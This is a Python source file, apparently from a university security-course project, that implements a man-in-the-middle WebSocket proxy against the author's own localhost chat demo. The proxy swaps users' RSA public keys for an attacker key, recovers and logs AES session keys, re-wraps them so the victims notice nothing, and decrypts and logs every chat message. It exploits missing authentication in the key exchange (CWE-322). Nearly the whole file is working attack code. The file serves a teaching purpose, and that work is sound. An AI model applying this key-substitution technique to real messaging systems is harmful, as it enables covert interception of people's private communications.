"""
Phase 3 (MitM attack) - COMP6841 project.

This simulates what happens
once a network attacker has achieved a position between two victims and
their real server (e.g. via ARP spoofing or a rogue access point.

How to "attack": instead of connecting to ws://localhost:8765 (the real
server), point two victims at ws://localhost:8766 (this proxy) instead.
Everything looks and works identically from both victims' point of view.Meanwhile, this script recovers and logs
every AES session key and every plaintext message exchanged.

Exploits: CWE-322 (Key Exchange without Entity Authentication) - the real
server (and the victims' browsers) never verify that a "pubkey" message
claiming to be from a given user actually came from that user's browser.
"""

import asyncio
import json
import logging

import aiohttp
from aiohttp import web

# crypto helpers (must match static/crypto.js exactly)
import base64
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def generate_rsa_keypair():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    return private_key, private_key.public_key()


def export_public_key_b64(public_key) -> str:
    der = public_key.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return base64.b64encode(der).decode()


def import_public_key_b64(b64: str):
    der = base64.b64decode(b64)
    return serialization.load_der_public_key(der)


def _oaep_padding():
    return padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)


def rsa_encrypt(public_key, data: bytes) -> str:
    ciphertext = public_key.encrypt(data, _oaep_padding())
    return base64.b64encode(ciphertext).decode()


def rsa_decrypt(private_key, b64: str) -> bytes:
    ciphertext = base64.b64decode(b64)
    return private_key.decrypt(ciphertext, _oaep_padding())


def aes_gcm_decrypt(raw_key: bytes, ciphertext_b64: str, iv_b64: str) -> str:
    aesgcm = AESGCM(raw_key)
    iv = base64.b64decode(iv_b64)
    ciphertext = base64.b64decode(ciphertext_b64)
    plaintext = aesgcm.decrypt(iv, ciphertext, None)
    return plaintext.decode()

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
log = logging.getLogger("mitm_proxy")

REAL_SERVER_WS = "ws://localhost:8765/ws"

attacker_priv, attacker_pub = generate_rsa_keypair()
attacker_pub_b64 = export_public_key_b64(attacker_pub)

real_pubkeys: dict[str, str] = {}
recovered_keys: dict[frozenset, bytes] = {}


def pair_key(a: str, b: str) -> frozenset:
    return frozenset({a, b})


class ConnectionState:
    def __init__(self):
        self.my_username: str | None = None
        self.pending_real_pubkey: str | None = None

    def learn_identity_from_downstream(self, data: dict):
        if self.my_username is None and data.get("to"):
            self.my_username = data["to"]
            if self.pending_real_pubkey:
                real_pubkeys[self.my_username] = self.pending_real_pubkey
                log.info(f"[MITM] Learned (passively, from traffic) that this connection is '{self.my_username}'")


async def handle_upstream_message(state: ConnectionState, data: dict) -> dict:
    msg_type = data.get("type")

    if msg_type == "pubkey":
        peer = data.get("to")
        real_key = data.get("publicKey")
        if state.my_username:
            real_pubkeys[state.my_username] = real_key
        else:
            state.pending_real_pubkey = real_key
        log.info(f"[MITM] {state.my_username or '(unknown so far)'} -> {peer}: intercepted real public key, substituting attacker's key")
        data["publicKey"] = attacker_pub_b64

    elif msg_type == "session_key":
        peer = data.get("to")
        wrapped = data.get("wrappedKey")
        try:
            raw_aes_key = rsa_decrypt(attacker_priv, wrapped)
            recovered_keys[pair_key(state.my_username, peer)] = raw_aes_key
            log.info(f"[MITM] Recovered AES session key between {state.my_username} and {peer}: "
                     f"{base64.b64encode(raw_aes_key).decode()}")

            real_peer_key_b64 = real_pubkeys.get(peer)
            if real_peer_key_b64:
                real_peer_key = import_public_key_b64(real_peer_key_b64)
                data["wrappedKey"] = rsa_encrypt(real_peer_key, raw_aes_key)
        except Exception as e:
            log.info(f"[MITM] Failed to unwrap session key from {state.my_username}: {e}")

    elif msg_type == "message":
        peer = data.get("to")
        key = recovered_keys.get(pair_key(state.my_username, peer))
        if key:
            try:
                plaintext = aes_gcm_decrypt(key, data.get("ciphertext", ""), data.get("iv", ""))
                log.info(f"[MITM] Decrypted message {state.my_username} -> {peer}: {plaintext!r}")
            except Exception as e:
                log.info(f"[MITM] Have a key for {state.my_username}<->{peer} but decryption failed: {e}")
        else:
            log.info(f"[MITM] No recovered key yet for {state.my_username}<->{peer}, message stays unreadable to us")

    return data


async def relay_client(client_ws: web.WebSocketResponse, token: str):
    state = ConnectionState()
    upstream = None
    try:
        session = aiohttp.ClientSession()
        upstream = await session.ws_connect(f"{REAL_SERVER_WS}?token={token}")

        async def pump_up():
            async for msg in client_ws:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    data = json.loads(msg.data)
                    data = await handle_upstream_message(state, data)
                    await upstream.send_json(data)

        async def pump_down():
            async for msg in upstream:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    data = json.loads(msg.data)
                    state.learn_identity_from_downstream(data)
                    await client_ws.send_str(msg.data)

        await asyncio.gather(pump_up(), pump_down())
    finally:
        if upstream is not None:
            await upstream.close()
        await session.close()


async def ws_handler(request: web.Request) -> web.WebSocketResponse:
    token = request.query.get("token", "")

    client_ws = web.WebSocketResponse()
    await client_ws.prepare(request)

    log.info("[MITM] a victim connected THROUGH THE PROXY (thinks this is the real server)")
    await relay_client(client_ws, token)
    return client_ws


def create_app() -> web.Application:
    app = web.Application()
    app.router.add_get("/ws", ws_handler)
    return app


if __name__ == "__main__":
    log.info("=" * 70)
    log.info("MITM PROXY running on ws://localhost:8766")
    log.info(f"Attacker public key (substituted for real users'): {attacker_pub_b64[:50]}...")
    log.info("Point victims at ws://localhost:8766 instead of :8765 to 'attack' them")
    log.info("=" * 70)
    web.run_app(create_app(), host="localhost", port=8766)